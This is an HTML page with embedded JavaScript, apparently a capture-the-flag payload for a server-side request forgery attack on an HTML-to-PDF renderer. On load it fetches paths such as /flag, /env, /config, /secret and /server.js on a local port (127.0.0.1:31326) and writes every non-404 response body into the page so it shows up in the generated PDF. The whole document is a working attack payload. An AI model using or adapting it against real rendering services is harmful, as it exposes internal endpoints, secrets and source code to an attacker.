<!DOCTYPE html>
<html>
<head>
    <title>Internal Route Fuzzer</title>
    <style>
        body { font-family: monospace; padding: 15px; background: #111; color: #0f0; }
        .ok { color: #0f6; font-weight: bold; }
        .other { color: #ff0; }
        pre { background: #222; padding: 8px; color: #fff; border: 1px solid #443; overflow-x: auto; }
    </style>
</head>
<body>
    <h2>Internal Endpoint & Directory Fuzzer</h2>
    <div id="results">Scanning internal server, please wait...</div>

    <script>
        async function runScan() {
            const baseUrl = 'http://127.0.0.1:31326';
            const paths = [
                '/', '/flag', '/flag.txt', '/admin', '/api', '/debug', '/status', 
                'robots.txt', '/source', '/file', '/files', '/download',
                '/config', '/env', '/secret', '/app.js', '/server.js',
                '/package.json', '/metrics', '/health', '/info', '/index.js'
            ];

            let htmlContent = '';

            // Map all paths to fetch promises and wait for ALL of them to complete
            const promises = paths.map(async (path) => {
                try {
                    const res = await fetch(baseUrl + path);
                    const text = await res.text();
                    
                    // Filter out standard 404 pages to keep the output clean, or show everything
                    if (res.status !== 404) {
                        htmlContent += `<div class="ok">[Status: ${res.status}] Path: ${path} (Bytes: ${text.length})</div>`;
                        if (text.length > 0 && text.length < 2000) {
                            htmlContent += `<pre>${text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>`;
                        }
                        htmlContent += '<hr style="border-color: #333;">';
                    }
                } catch (err) {
                    // Ignore connection errors for closed ports/paths
                }
            });

            // Wait until every single fetch request finishes
            await Promise.all(promises);

            // Update the DOM only after everything is gathered, ensuring it prints in the PDF
            document.getElementById('results').innerHTML = htmlContent || 'Scan finished, but no active endpoints responded.';
        }

        runScan();
    </script>
</body>
</html>
